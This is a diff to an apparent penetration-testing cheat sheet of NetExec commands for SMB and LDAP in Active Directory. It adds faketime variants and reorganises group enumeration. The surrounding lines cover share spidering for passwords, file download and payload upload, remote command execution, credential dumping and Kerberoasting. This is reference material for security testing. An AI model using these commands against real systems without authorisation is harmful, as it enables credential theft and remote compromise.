@@ -1570,7 +1570,7 @@ nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --filter-shares read,wr
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dir "C$"                              # list directory contents
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users                                 # enumerate users
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users --enabled                       # enabled users
-nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups                                # enumerate groups
+# NetExec moved group enumeration from smb to ldap; use ldap --groups below.
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --computers                             # enumerate computers
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-groups                          # enumerate local groups
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --smb-sessions                          # active SMB sessions
@@ -1583,6 +1583,8 @@ nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --tasklist                      
 # SMB spider / files / execution
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --spider C$ --spider-folder Users --pattern password       # search share names
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --spider C$ --regex ".*\\.txt$" --content                  # regex and content search
+# Use faketime when local clock skew breaks auth; DOWNLOAD_FLAG saves discovered files and OUTPUT_FOLDER=. writes them under the current directory.
+faketime 'now + <HOURS> hours' netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.    # recursive SMB spidering with downloads
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file "\\Windows\\Temp\\file.txt" ./file.txt          # download file
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file ./payload.exe "\\Windows\\Temp\\payload.exe"    # upload file
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x "whoami"                                                # execute cmd.exe command
@@ -1612,7 +1614,8 @@ nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M winscp                      #
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wifi                        # dump WiFi creds
 
 # LDAP
-nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --users --groups                        # enumerate users/groups
+nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --users                                 # enumerate AD users
+nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --groups                                # enumerate AD groups
 nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --computers                             # enumerate computers
 nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --dc-list                               # list domain controllers
 nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --get-sid                               # get domain SID
@@ -1621,6 +1624,7 @@ nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --admin-count                     
 nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --trusted-for-delegation                            # delegation targets
 nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --password-not-required                             # accounts with PASSWD_NOTREQD
 nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation                                   # delegation relationships
+faketime 'now + <HOURS> hours' netexec ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation    # delegation relationships with local clock offset
 nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --gmsa                                              # enumerate gMSA accounts
 nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --query "(objectClass=user)" "cn,sAMAccountName"    # custom query
 nxc ldap <DC> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting                # collect Kerberoast hashes
